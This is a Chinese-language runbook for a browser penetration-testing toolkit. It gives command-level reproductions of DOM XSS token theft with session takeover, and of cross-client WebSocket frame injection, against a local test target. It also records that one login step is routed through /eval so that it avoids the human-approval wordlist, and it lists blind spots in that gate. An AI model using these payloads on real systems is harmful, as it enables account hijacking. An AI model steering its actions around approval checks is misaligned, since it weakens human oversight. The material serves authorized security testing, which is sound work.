# 浏览器攻击面 runbook — 攻击档三工具 + SPA 攻击链复现(T2-2b-4-6/7)

攻击档(实弹)操作手册: 经常驻 cdp-proxy(:8893)对 scope 内目标复现 DOM XSS / WS 帧注入攻击链, 并把
**实际影响**(外带落审计/会话接管/跨客户端注入)钉进证据链。分工与姊妹篇: 侦察提取面(spa-render,
匿名面)见 `docs/browser-recon-runbook.md`; 断言 DSL 权威见 `docs/assertion-dsl.md`; MITM 证书面见
`docs/mitm-cert-runbook.md`; golden 靶场对照见 `tests/golden-targets/baseline.md`。命令级实跑原文:
`tests/golden-targets/spa-attack-acceptance.md`(2026-09-30, 本手册 §③ 的来源)。

## ① 前置 — cdp-proxy 常驻 / egress MITM / CA 分发

| 组件 | 期望状态 | 启用/验证命令(本批实跑原文) |
|---|---|---|
| cdp-proxy | systemd 常驻 :8893 | `systemctl --user enable --now d2d-cdp-proxy.service`(启用是一次性操作者动作, 单元头注释同款步骤); 验活 `curl -s http://127.0.0.1:8893/health` — 免鉴权, `ready:false` 属正常(**首个业务调用才懒拉起 chrome**, cdp-proxy.mjs:110-125), 拉起后 `cdp` 字段给出 CDP 端口 |
| egress 网关 | `D2D_EGRESS_MITM=1` active :8888 | `systemctl --user is-active d2d-egress.service` → `active`; `curl -s http://127.0.0.1:8888/health` → `{"ok":true,…}` |
| MITM CA | `<D2D_DATA_DIR>/mitm/{ca.key,ca.crt}` 在位, ca.key 0600 | 生成/分发/轮换全流程见 `docs/mitm-cert-runbook.md` ①-④(`ensureCA` 手动预生成 + adapter-dsh 对 worker 自动注入 `NODE_EXTRA_CA_CERTS`/`CURL_CA_BUNDLE`, worker 零手工) |
| SPA golden 靶场 | :8894 | `bash scripts/ops/spa-start.sh start` — 就绪判据 `/api/notes=401` `/=200`(spa-start.sh:46-50); 收尾 `stop` |
| 鉴权 | X-Auth 二选一 | `HT=$(cat ~/.config/d2d/worker-token)`(或 host-token; cdp-proxy.mjs:37,221) — **凭据只从文件读, 任何文档/命令不留字面量** |

- **流量路径实测注记(2026-09-30, 如实)**: 池 chrome 虽带 `--proxy-server=http://127.0.0.1:8888`, 但
  launch 未传 `<-loopback>` 反制 → chromium 对**回环目标走隐式 bypass 直连**(全程零 chromium→:8888
  连接, egress 证据 `evidence/proxy/proxy-*.jsonl` 零 `:8894` 行)。回环攻击流量真正过的闸是 **CDP
  Fetch gate**(audit.jsonl 逐请求落痕, §④); egress 网关本批拦到的是 chromium 自身后台 CONNECT
  (`deny accounts.google.com … CONNECT not in scope`)。回环是否收进 egress 属 cdp-proxy 出网治理
  议题, 留 upstream(禁区文件不本批改)。
- scope 门双源: 静态 `P2P_PROXY_ALLOW`(缺省 `127.0.0.1,localhost`)∪ graphd 动态 scope(30s 刷新,
  cdp-proxy.mjs:39-65); 非 scope 导航/子资源/重定向一律 AccessDenied(fail-closed, cdp-proxy.mjs:184-194)。

## ② 三工具用法 — form-fuzzer / logic-tester / race-condition

浏览器攻击三工具(`scripts/browser/`, CLI/模块双形态, 共享底座 `cdp-client.mjs` 只 import validator
的 `parseAssertions`/`evaluateAssertions` 做断言桥, 零触碰 validator 本体):

| 工具 | 用法行(CLI 形状) | 关键参数 | 产出 |
|---|---|---|---|
| form-fuzzer | `node scripts/browser/form-fuzzer.mjs --base http://127.0.0.1:8893 --url <scope 内目标> [--builtin xss,sqli,cmdi] [--list a,b] [--fields #id,#name] [--assertions '{"type":"html_contains","value":"…"}'│JSON 数组] [--capture dom│fetch] [--audit-file <path>]` | 字段枚举→逐字段 `/fill` 注入→`/click` 提交(无按钮回退 `/eval form.requestSubmit()`); `--max-fields`/`--max-submissions` 限幅 | 命中数组(field/payload/hits) + DOM 前后差分 + 工具审计行 |
| logic-tester | `node scripts/browser/logic-tester.mjs --base http://127.0.0.1:8893 --steps <JSON 数组文件路径或内联 JSON> [--start-url <url>]` | steps 数据驱动(navigate/eval/mark/assert), 零硬编码业务; 内置跳步检测(checkStepOrder)/参数篡改(tamperFetchExpr)/状态机操纵(stateTamperExpr 换 localStorage token 后调受保护 API) | 逐步结果 + order(missing/jumped/outOfOrder) + domDiff |
| race-condition | `node scripts/browser/race-condition.mjs --base http://127.0.0.1:8893 --url <scope 内目标> --n 3 --eval "(async()=>{…})()" [--before-expr <js>] [--after-expr <js>]` | `--n` 硬上限 5(超限拒绝); 单条 `/eval` 内 `Promise.all` n 路同回合起跑 | lane 结果 + statuses 分布 + maxSkewMs + audit.jsonl 同时性行解读(不代读) |

**审批语义: browser-state-change = high 恒人工**。判定与 worker 命令面的接线:

- 形态判定 = **三重合取**(approvals.mjs:112-131, tier-approval.mjs:77-104 同串镜像): 命令串含
  cdp-proxy `host:port`(默认 8893 ∪ `D2D_CDP_PROXY` 同源端口) ∧ `/fill|/click|/clickAt` 变更路由 ∧
  提交语义(`type=submit|button[type=submit]|form.submit()|requestSubmit`) → `classifyRisk` 返回
  `{kind:'ask', matched:'browser-state-change'}`。
- 档位: **恒 high, 永不自动放宽**(tier-approval.mjs:217-227 ⓪, 与 STATE_MUTATION 同级硬语义;
  `P2P_TRUST_MODE=on` 的 ledger-auto 只作用于 mid 档, high 单照常落单等人工)。queue 模式 = 落
  `<D2D_DATA_DIR>/approvals/pending-approvals.jsonl` + 阻塞轮询(approved 放行/其余 deny,
  超时拒 fail-closed); native 模式 = 宿主 approval 链接桥。矩阵见 `docs/approval-channels.md` §6/§8。
- 语义根据: 表单提交/点击 = 目标系统**状态变更类**动作(cdp-proxy 原语里唯二能产生服务端副作用的
  路由), 与 bash 高危同档; 纯 `/navigate`+`/eval` 组合(读型页内 fetch)不触发该词表。
- **已知自报缺口(如实)**: form-fuzzer 的 `/eval form.requestSubmit()` 回退的传输路由(`/eval`)不在
  审批面机检词表内 — 工具审计行以 `planeMatch:false` 自报该缺口, 宁过报不过漏(form-fuzzer.mjs 头注释)。
- 工具自身审计行: `fileAuditSink` → `<D2D_DATA_DIR>/browser-attack.audit.jsonl`(`P2P_ATTACK_AUDIT`
  显式覆盖; cdp-client.mjs:104-112) — 与 cdp-proxy 的 audit.jsonl 是**两份账**, 前者记工具动作, 后者记页面请求。

## ③ SPA 攻击链复现(命令级, golden 靶场 :8894)

以下为 `spa-attack-acceptance.md` 实跑的命令骨架(targetId 逐跑不同, 以当次返回为准; `$HT` 见①):

**V1 — 无鉴权管理接口(HTTP 面已证, 攻击链标注已覆盖)**:

```bash
curl -s http://127.0.0.1:8894/api/admin/stats        # 无 token → 200 + warning 原文
```

**V2 — DOM XSS: 注入 → token 外带落审计 → 会话接管**(sink=app.js:175 `result.innerHTML`):

```bash
# 1) 开页(首次业务调用懒拉起池 chrome) + 页内登录置 token(等价 app.js 表单路径, 避开 /fill+/click 审批词表)
curl -s -X POST http://127.0.0.1:8893/new -H "X-Auth: $HT" -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1:8894/#/login"}'                                  # → {"ok":true,"targetId":"<A>"}
curl -s -X POST http://127.0.0.1:8893/eval -H "X-Auth: $HT" -H 'Content-Type: application/json' \
  -d '{"target":"<A>","expression":"(async()=>{const r=await fetch('/api/login',{method:'POST',\
headers:{'Content-Type':'application/json'},body:JSON.stringify({user:'user',password:'x'})});\
const d=await r.json();localStorage.setItem('spa_token',d.token);return d.user})()"}'
# 2) 注入: payload = <img src=x onerror="fetch('/api/search?q='+encodeURIComponent(localStorage.spa_token||'no-token'))">
curl -s -X POST http://127.0.0.1:8893/navigate -H "X-Auth: $HT" -H 'Content-Type: application/json' \
  -d '{"target":"<A>","url":"http://127.0.0.1:8894/#/search?q=%3Cimg%20src%3Dx%20onerror%3D%22fetch(%27/api/search?q=%27%2BencodeURIComponent(localStorage.spa_token%7C%7C%27no-token%27))%22%3E"}'
# 3) 执行证据轮询(注入节点稳定存在即执行)
curl -s -X POST http://127.0.0.1:8893/eval … -d '{"target":"<A>","expression":"JSON.stringify({img:document.querySelector('#app img')?.outerHTML??null,imgs:document.querySelectorAll('#app img').length})"}'
# 4) 外带证据: 记 T0=$(date -u +%Y-%m-%dT%H:%M:%S) 后按时间窗 grep(§④), 命中 /api/search?q=eyJ… 即 token 化 URL 落审计
# 5) 会话接管: 同语境持 token 调受保护 API, 响应喂 evaluateAssertions(json_path 直判)
curl -s -X POST http://127.0.0.1:8893/eval … -d '{"target":"<A>","expression":"(async()=>{const t=localStorage.getItem('spa_token');const r=await fetch('/api/notes',{headers:{Authorization:'Bearer '+t}});return JSON.stringify({status:r.status,body:await r.text()})})()"}'
node --input-type=module -e 'const {evaluateAssertions,parseAssertions}=await import("file://<repo>/plugin/pentest-dsh/validator.js"); \
  console.log(evaluateAssertions({body:process.argv[1]},parseAssertions([{type:"json_path",path:"sub",value:"user"}]),{channel:"cdp",navStatus:200}))' "$BODY"
# → hit:true, hits:["json_path=sub=user"] 即会话接管成立
```

**V3 — WS 跨客户端帧注入: 纯 cdp 化发帧 → 他人页面 DOM 污染 → 外带**(sink=app.js:203 `insertAdjacentHTML`):

```bash
# 1) 两页在线(各自 connectWs 自连 /ws): 页 A=发帧方+受害方, 页 B=跨客户端纯受害方
curl -s -X POST http://127.0.0.1:8893/new … -d '{"url":"http://127.0.0.1:8894/#/login"}'   # → <A>
curl -s -X POST http://127.0.0.1:8893/new … -d '{"url":"http://127.0.0.1:8894/#/login"}'   # → <B>
# 2) 页 A /eval 内 new WebSocket 发攻击帧(无外部 WS 客户端; 记 T0_V3)
#    帧1 = <img src=x onerror="fetch('/api/search?q=ws-'+document.title)">   ← 外带载荷
#    帧2 = <img src=x onerror="window.__wsx=(window.__wsx||0)+1">            ← 执行计数
#    服务端原样广播含发送者回显(spa-server.mjs:333-339) → 攻击 socket echoRecv 应 = 帧数
curl -s -X POST http://127.0.0.1:8893/eval … -d '{"target":"<A>","expression":"new Promise((res)=>{const ws=new WebSocket('ws://127.0.0.1:8894/ws');window.__atk=ws;window.__atkRecv=[];ws.onopen=()=>{ws.send(`<img src=x onerror=\"fetch('/api/search?q=ws-'+document.title)\">`);setTimeout(()=>ws.send(`<img src=x onerror=\"window.__wsx=(window.__wsx||0)+1\">`),300)};ws.onmessage=(ev)=>window.__atkRecv.push(ev.data);setTimeout(()=>res(JSON.stringify({sent:2,echoRecv:window.__atkRecv.length})),2500)})"}'
# 3) 页 B 三件套断言(跨客户端): 注入节点(.ws-msg img×2) + 执行计数(wsx>=1) + 外带审计行(§④)
curl -s -X POST http://127.0.0.1:8893/eval … -d '{"target":"<B>","expression":"JSON.stringify({wsx:window.__wsx??null,msgs:document.querySelectorAll('.ws-msg').length,imgs:[...document.querySelectorAll('.ws-msg img')].map(n=>n.outerHTML)})"}'
# 4) 收尾: /close 逐页回收 + bash scripts/ops/spa-start.sh stop(靶场进程本就应随演练终止)
```

判定照 4.5-3 三行形态落档(动作序列/断言结果/证据/判定); 实跑判定原文见
`tests/golden-targets/spa-attack-acceptance.md` §1/§2。

## ④ 证据链 — 四通道

| 通道 | 落点 | 形态与纪律 |
|---|---|---|
| 请求级审计 | `<D2D_DATA_DIR>/evidence/cdp/audit.jsonl` | cdp-proxy 对每个过 Fetch 闸的页面请求落 `{ts,event:'fetch-allow'│'fetch-deny',url}`(URL 截 200 字符, cdp-proxy.mjs:192); **外带证据的读法: token/数据被编码进 URL 后, 该行即服务端视角的外带见证**(§③ V2 帧 `?q=eyJ…` = JWT 本体, V3 帧 `?q=ws-<title>` = 页内信息)。**全局共享文件: 只按时间窗 grep(`awk '…substr($0,8,19)>=T0'`), 绝不删除/改写他人行**; 实跑全量归因样板见 acceptance §2.4。缺口: `ws://` 握手不落本审计(见⑤) |
| HAR | `<runsBase>/evidence/har/<findingId>.har` | 走 validator `validateFinding` 通道时自动产(cdp-first 重放录 DOM 快照/资源瀑布, `writeEvidenceHar`); **AES-256-GCM 加密落盘**, KEK=SHA-256(host-token 文件原文), 读回 `readEvidenceFile`, 错密钥认证拒绝 — 形态权威 `docs/assertion-dsl.md` §④, 实跑样例 spa-verify-acceptance.md §2.1 |
| 截图 | `<D2D_DATA_DIR>/evidence/cdp/<eng>-<ts>.png` | cdp-proxy `/screenshot`(cdp-proxy.mjs:283-289), 事件同名落 audit.jsonl; 注入后截屏 = 面向人审的可见证据(审计行为机检证据, 两者互补) |
| 信号入图 | graphd `/write/signal` | 攻击实证按渲染面信号契约入图: `{"type":"dom-xss-suspect","surface":"js","boundary":"inner","endpoint_url":"<来源端点>"}`(surface/boundary 只填枚举, `docs/browser-recon-runbook.md` §4.1), evidence 装三要素(source/sink/载体)+audit 行号; verified 级判定随 `gate_anchor` 的 `gate_v.assertions` 携带 DSL 对象数组(§③ V2 的 `json_path=sub=user` 即合法成员; 锚校验与透传语义见 `docs/gate-anchor-schema.md` + `docs/assertion-dsl.md` §⑤) — 信号只到 suspected/实证级, Finding 状态机走 4.5-3 七态, 不自封 verified |

- **证据完整性三问**(审阅任何攻击报告时): audit 行在不在(请求确实发生)→ URL 里有没有编码进数据
  (外带成立)→ 响应断言 HIT 没有影响成立(接管/污染)。三问齐答才是实际影响, 缺一降级为可达性证据。

## ⑤ 与 4.5-3 的衔接与边界

**衔接**: 4.5-3 验证档的判定面(登录态导航 + DSL 断言 + 三行判定)是本攻击档的**产出格式**——攻击链
跑出的每条结论都以同一形态落档可复核; 差别仅在断言材料: 验证档用 `status/html_contains/selector_*`,
攻击档加用 `json_path` 直判响应体身份字段(sub=user 会话接管)与 audit.jsonl 外带行(请求确实发生的
代理侧见证)。升级路径: 渲染面 Signal_(surface=js, suspected)→ 本档攻击实证(本文 §③/§④)→
Finding 七态机, 三段各不自封更高状态。

**已知边界(实跑两跑一致, 如实记录, 修复归 upstream, 本档零触碰禁区文件)**:

1. **WS 握手不过 Fetch 闸**: 页内 `ws://` 连接照常建立, chromium 150 的 `Fetch.enable` 未对
   WebSocket 握手发 requestPaused → audit.jsonl 零 `ws://` 行(spa-verify-acceptance §2.3 与本档
   §2.3 双跑实测)。WS 面**注入证据在页面 DOM/帧交互**(三件套里的前两件), 外带证据要靠载荷自己
   发 http(s) fetch(V3 帧 1 形态)才落审计。`ws://` 出网治理是否补强 = cdp-proxy 安全边界议题留 upstream。
2. **回环不走 egress 网关**: chromium 隐式 loopback bypass(launch 未传 `<-loopback>`, cdp-proxy.mjs
   :140-141 不发 bypass 列表 ≠ 回环过网关) — 回环靶场流量只过 CDP Fetch gate, 不过 egress
   scope/限速/解密面(§① 实测注记)。`docs/browser-recon-runbook.md` §② "回环流量同样过网关"的
   旧表述与本次实测不符, 以本文为准留 upstream 裁决。
3. **闸 attach 竞态窗口**: `/new` 的主文档请求可能先于 `Fetch.enable` 落地(闸从会话 attach 起生效)
   → 页面加载早期的个别子资源可能不落 audit.jsonl(acceptance §2.4 行 1-3 有、A/B 页无的实证);
   攻击证据不受影响(攻击请求全部发生在 attach 之后, 逐条落痕)。
4. **URL 200 字符截断**: audit 行 URL 超 200 字符截尾(cdp-proxy.mjs:192) — 外带载荷设计时让关键
   证据(身份/标记)前置; JWT 形态 token(~153B+URL 前缀≈188B)恰在截断线内完整落审计。
5. **审批词表盲区**: `/eval requestSubmit()` 回退与页内 `form.submit()` 不在 browser-state-change
   机检词表(传输路由是 `/eval`) — 工具审计行自报 `planeMatch:false`(§②); 人工审阅攻击报告时把
   `/eval` 里的提交语义当 high 对待。

## 测试

- 单测: `plugin/pentest-dsh/test/browser-attack.test.mjs`(三工具纯函数/CLI 形状/断言桥/审计行)、
  `approvals.test.mjs`/`tier-approval.test.mjs`(browser-state-change 词表同串 guard/恒 high 不放宽)。
- 集成验收实跑(本手册 §③ 的命令级来源): `tests/golden-targets/spa-attack-acceptance.md`
  (V2 外带+接管 / V3 跨客户端注入+外带, 2026-09-30); 前序执行级: `spa-verify-acceptance.md`、
  `spa-recon-acceptance.md`。
